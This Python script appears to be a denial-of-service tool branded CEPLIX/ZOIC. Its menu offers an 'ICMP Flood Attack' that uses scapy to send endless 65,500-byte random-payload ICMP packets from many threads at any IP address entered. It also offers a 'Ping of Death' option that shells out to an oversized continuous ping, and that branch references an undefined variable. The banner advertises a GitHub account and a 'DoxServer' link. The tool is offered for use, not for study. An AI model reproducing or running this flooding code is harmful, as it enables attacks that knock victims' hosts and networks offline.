import os
import random
import threading
import time
import sys
from scapy.all import IP, ICMP, send

ceplix = "\033[38;5;118m"
white = "\033[97m"
red = "\033[38;5;196m"
green = "\033[38;5;34m"
clear = "\033[0m"

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{ceplix}
██╗      █████╗ ██╗   ██╗███████╗██████╗     ██████╗ 
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██╗
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝     █████╔╝
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗     ╚═══██╗
███████╗██║  ██║   ██║   ███████╗██║  ██║    ██████╔╝
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═════╝ {clear}
               
╔═════════════════════════════════════════════════════╗
║ {ceplix}*{clear} Github    {ceplix}:{clear}   https://github.com/ceplix-53        ║
║ {ceplix}*{clear} DoxServer {ceplix}:{clear}   https://rvlt.gg/PnjMbQwH            ║
║ {ceplix}*{clear} version   {ceplix}:{clear}   4.0                                 ║
║ {ceplix}*{clear} CEPLIX    {ceplix}:{clear}   {ceplix}[{clear}{white}LAYER3{clear}{ceplix}]{clear}                            ║  
╚═════════════════════════════════════════════════════╝
          
╔═════════════════════════════════════════════════════╗
║ {ceplix}[{clear}1{ceplix}]{clear} ICMP Flood Attack                               ║
║ {ceplix}[{clear}2{ceplix}]{clear} Ping Of Death Attack {ceplix}[{clear}{red}NOT WORK{clear}{ceplix}]{clear}                 ║                       
║ {ceplix}[{clear}3{ceplix}]{clear} Exit CEPLIX                                       ║                                 
╚═════════════════════════════════════════════════════╝  
""")
    
def layer3():
    while True:
        logo()
        select = input(f"""
╔═══[{ceplix}root{clear}@{ceplix}ZOIC{clear}]
╚══{ceplix}>{clear} """)
                                        
        if select == "1" or select.lower() == "1":
            def send_packet(target):
                try:
                    while True:
                        payload = random._urandom(65500)  
                        packet = IP(dst=target) / ICMP(type=8, chksum=None) / payload

                        send(packet, verbose=False)

                        print(f"[{ceplix}ZOIC{clear}] IP Address {ceplix}:{clear} {target} {ceplix}|{clear} ICMP Packet {ceplix}:{clear} {white}65500{clear}")

                except Exception as e:
                    print(f"[{red}WARNING{clear}] Check your permissions or install {ceplix}Npcap{clear} : https://npcap.com/#download")
                    time.sleep(2)
                    print(f"{red}......................ERROR......................{clear}")
                    time.sleep(2)

            def start_threads(target, threads):
                thread_list = []

                for i in range(threads):
                    t = threading.Thread(target=send_packet, args=(target,))
                    thread_list.append(t)
                    t.start()

                for t in thread_list:
                    t.join()

            target = input(f"[{ceplix}CEPLIX{clear}] IP {ceplix}>{clear} ")
            threads = int(input(f"[{ceplix}CEPLIX{clear}] THREAD {ceplix}>{clear} "))

            start_threads(target, threads)


        elif select == "2" or select.lower() == "2":
            def ping(target):
                os.system(f"ping {target} -t -l 65500")

            target = input(f"[{zoic}ZOIC{clear}] IP {zoic}>{clear} ")

            ping(target)

        elif select == "3" or select.lower() == "3":
            sys.exit()



if __name__ == "__main__":
    layer3()
